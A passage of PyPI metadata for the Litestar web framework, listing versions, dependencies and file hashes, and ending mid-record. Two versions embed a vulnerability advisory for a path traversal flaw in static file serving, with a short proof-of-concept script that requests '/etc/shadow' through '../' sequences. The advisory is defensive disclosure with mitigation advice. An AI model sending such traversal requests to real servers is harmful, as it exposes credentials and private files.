:: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,asgi,litestar,starlite","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/litestarapi","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.0rc1/","requires_dist":["alembic ; extra == \"sqlalchemy\" or extra == \"full\"","annotated-types ; extra == \"annotated-types\" or extra == \"full\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers (>=1.0.2)","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","importlib-resources (>=5.12.0) ; python_version < \"3.9\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4) ; extra == \"mako\" or extra == \"full\"","msgspec (>=0.17.0)","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","piccolo ; extra == \"piccolo\" or extra == \"full\"","picologging ; extra == \"picologging\" or extra == \"full\"","polyfactory (>=2.6.3)","prometheus-client ; extra == \"prometheus\" or extra == \"full\"","pydantic[email] ; extra == \"pydantic\" or extra == \"full\"","pydantic-extra-types ; extra == \"pydantic\" or extra == \"full\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4,<4.5.0) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","rich-click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.12) ; extra == \"sqlalchemy\" or extra == \"full\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions","uvicorn[standard] (>=0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\""],"requires_python":">=3.8,<4.0","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.0.0rc1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"ecc05c18bd52cbd7ad3b9bce7eb2329921b936c2c42a4f3e45307c1d4fdb2c7e","md5":"acc9664747f2a57e1e2ce24c1ecfffc6","sha256":"a3d9ac724326ce3836fd8295b6352e634df5a338bfb089a67b3812c79eb1498f"},"downloads":-1,"filename":"litestar-2.0.0rc1-py3-none-any.whl","has_sig":false,"md5_digest":"acc9664747f2a57e1e2ce24c1ecfffc6","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":469612,"upload_time":"2023-08-05T15:13:23","upload_time_iso_8601":"2023-08-05T15:13:23.391921Z","url":"https://files.pythonhosted.org/packages/ec/c0/5c18bd52cbd7ad3b9bce7eb2329921b936c2c42a4f3e45307c1d4fdb2c7e/litestar-2.0.0rc1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"8079be63470c4975ec4d7dcfee5e8428ca238391c682995b1a4950d0ce6345ff","md5":"16aa3ad640c52b399ed01368eb8f7900","sha256":"927abab8e1f99adef4538d4721ecfcb7774e6579b7d33a1ef33b390b8200fe09"},"downloads":-1,"filename":"litestar-2.0.0rc1.tar.gz","has_sig":false,"md5_digest":"16aa3ad640c52b399ed01368eb8f7900","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":332710,"upload_time":"2023-08-05T15:13:25","upload_time_iso_8601":"2023-08-05T15:13:25.650921Z","url":"https://files.pythonhosted.org/packages/80/79/be63470c4975ec4d7dcfee5e8428ca238391c682995b1a4950d0ce6345ff/litestar-2.0.0rc1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"2.0.1":{"info":{"author":"Na'aman Hirschfeld","author_email":"nhirschfeld@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Framework :: AsyncIO","Framework :: Pydantic","Framework :: Pydantic :: 1","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,asgi,litestar,starlite","license":"MIT","maintainer":"Na'aman Hirschfeld","maintainer_email":"nhirschfeld@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/litestarapi","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.0.1/","requires_dist":["alembic ; extra == \"sqlalchemy\" or extra == \"full\"","annotated-types ; extra == \"annotated-types\" or extra == \"full\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers (>=1.0.2)","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","importlib-resources (>=5.12.0) ; python_version < \"3.9\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4) ; extra == \"mako\" or extra == \"full\"","msgspec (>=0.17.0)","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","piccolo ; extra == \"piccolo\" or extra == \"full\"","picologging ; extra == \"picologging\" or extra == \"full\"","polyfactory (>=2.6.3)","prometheus-client ; extra == \"prometheus\" or extra == \"full\"","pydantic[email] ; extra == \"pydantic\" or extra == \"full\"","pydantic-extra-types ; extra == \"pydantic\" or extra == \"full\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4,<4.5.0) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","rich-click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.12) ; extra == \"sqlalchemy\" or extra == \"full\"","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions","uvicorn[standard] (>=0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\""],"requires_python":">=3.8,<4.0","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.0.1","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"3eb5ad040f923f1661240eaae883b7d3fec29ea6614d7e732d051fc16400998f","md5":"7c2504afa4f5a016469be42fdf7be020","sha256":"44e4b0965769b8263680fd9495d77e3defc3afdbb09747fa8d9ec338b94f147f"},"downloads":-1,"filename":"litestar-2.0.1-py3-none-any.whl","has_sig":false,"md5_digest":"7c2504afa4f5a016469be42fdf7be020","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":471252,"upload_time":"2023-08-21T18:47:41","upload_time_iso_8601":"2023-08-21T18:47:41.140900Z","url":"https://files.pythonhosted.org/packages/3e/b5/ad040f923f1661240eaae883b7d3fec29ea6614d7e732d051fc16400998f/litestar-2.0.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"d69672ccd412dbf8254bc487883efa272749226e13e93a7f7c7e73cfd2a5b993","md5":"d31e7a6a184fe66317b7ebea48c017f4","sha256":"f47d11f7fa4a05e562655e02277aa0647da72b0c9be5ba3b3ed32f5efe38c98d"},"downloads":-1,"filename":"litestar-2.0.1.tar.gz","has_sig":false,"md5_digest":"d31e7a6a184fe66317b7ebea48c017f4","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":333986,"upload_time":"2023-08-21T18:47:43","upload_time_iso_8601":"2023-08-21T18:47:43.266406Z","url":"https://files.pythonhosted.org/packages/d6/96/72ccd412dbf8254bc487883efa272749226e13e93a7f7c7e73cfd2a5b993/litestar-2.0.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.1.0":{"info":{"author":"Cody Fincher","author_email":"cody.fincher@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,asgi,litestar,starlite","license":"MIT","maintainer":"Cody Fincher","maintainer_email":"cody.fincher@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue Tracker":"https://github.com/litestar-org/litestar/issues?q=is%3Aissue+is%3Aopen+sort%3Aupdated-desc","Reddit":"https://www.reddit.com/r/litestarapi","Repository":"https://github.com/litestar-org/litestar","Twitter":"https://twitter.com/LitestarAPI"},"provides_extra":null,"release_url":"https://pypi.org/project/litestar/2.1.0/","requires_dist":["advanced-alchemy (==0.2.0) ; extra == \"sqlalchemy\" or extra == \"full\"","alembic","annotated-types ; extra == \"annotated-types\" or extra == \"full\"","anyio (>=3)","attrs ; extra == \"attrs\" or extra == \"full\"","brotli ; extra == \"brotli\" or extra == \"full\"","click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","cryptography ; extra == \"cryptography\" or extra == \"jwt\" or extra == \"full\"","fast-query-parsers (>=1.0.2)","httpx (>=0.22)","importlib-metadata ; python_version < \"3.10\"","importlib-resources (>=5.12.0) ; python_version < \"3.9\"","jinja2 (>=3.1.2) ; extra == \"jinja\" or extra == \"standard\" or extra == \"full\"","jsbeautifier ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","mako (>=1.2.4) ; extra == \"mako\" or extra == \"full\"","minijinja (>=1.0.0) ; extra == \"minijinja\" or extra == \"full\"","msgspec (>=0.18.2)","multidict (>=6.0.2)","opentelemetry-instrumentation-asgi ; extra == \"opentelemetry\" or extra == \"full\"","piccolo ; extra == \"piccolo\" or extra == \"full\"","picologging ; extra == \"picologging\" or extra == \"full\"","polyfactory (>=2.6.3)","prometheus-client ; extra == \"prometheus\" or extra == \"full\"","pydantic-extra-types ; extra == \"pydantic\" or extra == \"full\"","pydantic[email] ; extra == \"pydantic\" or extra == \"full\"","python-jose ; extra == \"jwt\" or extra == \"full\"","pyyaml","redis[hiredis] (>=4.4.4) ; extra == \"redis\" or extra == \"full\"","rich (>=13.0.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","rich-click ; extra == \"cli\" or extra == \"standard\" or extra == \"full\"","sqlalchemy (>=2.0.12)","structlog ; extra == \"structlog\" or extra == \"full\"","typing-extensions","uvicorn[standard] (>=0.22.0) ; extra == \"cli\" or extra == \"standard\" or extra == \"full\""],"requires_python":">=3.8,<4.0","summary":"Litestar - A production-ready, highly performant, extensible ASGI API Framework","version":"2.1.0","yanked":false,"yanked_reason":null},"last_serial":25130260,"urls":[{"comment_text":"","digests":{"blake2b_256":"923fe9e7865dee585a620df26ffbab9da3c95598c3338c008e79f29a805bfddf","md5":"2dbce9f95b8c4596fc2b2c11f2267c7e","sha256":"20927e741f8dfe2368dd0964a17534051d7b64b69aa122ad55e8787afdc1e9c1"},"downloads":-1,"filename":"litestar-2.1.0-py3-none-any.whl","has_sig":false,"md5_digest":"2dbce9f95b8c4596fc2b2c11f2267c7e","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4.0","size":449261,"upload_time":"2023-09-25T01:34:44","upload_time_iso_8601":"2023-09-25T01:34:44.022489Z","url":"https://files.pythonhosted.org/packages/92/3f/e9e7865dee585a620df26ffbab9da3c95598c3338c008e79f29a805bfddf/litestar-2.1.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"0df7f88dc3af14f84fdc9321828000adee0ba8604da4eb18adba6b2bd3f5c426","md5":"1b6da629a316df0ddcba81e848f361ad","sha256":"6117e6f4edaa7c805a1d209d7e4c014def70a7046e02fda0345e37ae97f7c50a"},"downloads":-1,"filename":"litestar-2.1.0.tar.gz","has_sig":false,"md5_digest":"1b6da629a316df0ddcba81e848f361ad","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4.0","size":312652,"upload_time":"2023-09-25T01:34:46","upload_time_iso_8601":"2023-09-25T01:34:46.064136Z","url":"https://files.pythonhosted.org/packages/0d/f7/f88dc3af14f84fdc9321828000adee0ba8604da4eb18adba6b2bd3f5c426/litestar-2.1.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-32982"],"details":"# Summary\n**Local File Inclusion via Path Traversal in LiteStar Static File Serving**\n\nA Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.\n\n## Details\nThe vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).\n\nThe function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:\n\n```python\ncommonpath([str(directory), file_info[\"name\"], joined_path])\n```\n\nGiven the variables:\n```python\ndirectory = PosixPath('/Users/brian/sandbox/test_vuln/static')\nfile_info[\"name\"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'\njoined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')\n```\n\nThe function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.\n\n\n## Proof of Concept (PoC)\nTo reproduce this vulnerability, follow these steps:\n\n1. **Set up the environment:**\n   - Install with pip the `uvicorn` and `litestar` packages.\n   - Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.\n   - Ensure the static file serving is enabled, which is typically the default configuration.\n\n2. **Preparation of the testing environment:**\n   - If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.\n   - Create a `main.py` file with the following content to configure and run the LiteStar server:\n\n    ```python\n    from pathlib import Path\n    from litestar import Litestar\n    from litestar.static_files import create_static_files_router\n    import uvicorn\n\n    app = Litestar(\n        route_handlers=[\n            create_static_files_router(path=\"/static\", directories=[\"static\"]),\n        ],\n    )\n\n    if __name__ == \"__main__\":\n        uvicorn.run(\"main:app\", host=\"0.0.0.0\", port=8000)\n    ```\n\n   - Run this script with the command `python3 main.py` to start the server.\n\n3. **Exploit:**\n   - Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:\n\n    ```python\n    import http.client\n\n    def send_request(host, port, path):\n        connection = http.client.HTTPConnection(host, port)\n        connection.request(\"GET\", path)\n        response = connection.getresponse()\n        print(f\"Status: {response.status}\")\n        print(f\"Headers: {response.getheaders()}\")\n        data = response.read()\n        print(f\"Body: {data.decode('utf-8')}\")\n        connection.close()\n\n    send_request(\"localhost\", 8000, \"/static/../../../../../../etc/shadow\")\n    ```\n\n   - Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.\n\n4. **Observe:**\n   - The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.\n   - The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.\n\n\n## Impact\n\nThis Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:\n\n1. **Exposure of Sensitive Information:**\n   - The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.\n\n2. **Potential for System Compromise:**\n   - If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.\n\n3. **Credential Leakage:**\n   - Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.\n\n4. **Regulatory and Compliance Violations:**\n   - Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.\n\n5. **Loss of Trust and Reputation Damage:**\n   - Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.\n\n6. **Potential for Further Exploitation:**\n   - The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.\n\n\n\nHere's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:\n\n\n## Mitigation Suggestion\n\nTo effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:\n\n1. **Input Validation and Sanitization:**\n   - Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.\n   - Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.\n\n2. **Path Normalization:**\n   - Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.\n   - As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:\n     ```python\n     if os.path.commonpath([full_path, directory]) != directory:\n         # Don't allow misbehaving clients to break out of the static files\n         # directory.\n         continue\n     ```\n     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.\n\n\n## Comments\n**Naming Convention:**\n- From versions 0.X.X through 1.X.X, the package was released under the name \"starlite.\"\n- Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name \"litestar.\"\n\n**Feature Additions and Changes:**\n- Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.\n- Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.","fixed_in":["2.8.3","2.7.2","2.6.4"],"id":"GHSA-83pv-qr33-2vcf","link":"https://osv.dev/vulnerability/GHSA-83pv-qr33-2vcf","source":"osv","summary":null,"withdrawn":null}]},"2.1.1":{"info":{"author":"Cody Fincher","author_email":"cody.fincher@gmail.com","bugtrack_url":null,"classifiers":["Development Status :: 5 - Production/Stable","Environment :: Web Environment","Intended Audience :: Developers","Intended Audience :: Information Technology","Intended Audience :: System Administrators","License :: OSI Approved :: MIT License","Natural Language :: English","Operating System :: OS Independent","Programming Language :: Python","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9","Topic :: Internet","Topic :: Internet :: WWW/HTTP","Topic :: Internet :: WWW/HTTP :: HTTP Servers","Topic :: Software Development","Topic :: Software Development :: Libraries","Topic :: Software Development :: Libraries :: Application Frameworks","Topic :: Software Development :: Libraries :: Python Modules","Typing :: Typed"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://litestar.dev/","keywords":"api,rest,asgi,litestar,starlite","license":"MIT","maintainer":"Cody Fincher","maintainer_email":"cody.fincher@gmail.com","name":"litestar","package_url":"https://pypi.org/project/litestar/","platform":null,"project_url":"https://pypi.org/project/litestar/","project_urls":{"Blog":"https://blog.litestar.dev","Changelog":"https://github.com/litestar-org/litestar/releases/","Discord":"https://discord.gg/MmcwxztmQb","Documentation":"https://docs.litestar.dev/","Homepage":"https://litestar.dev/","Issue 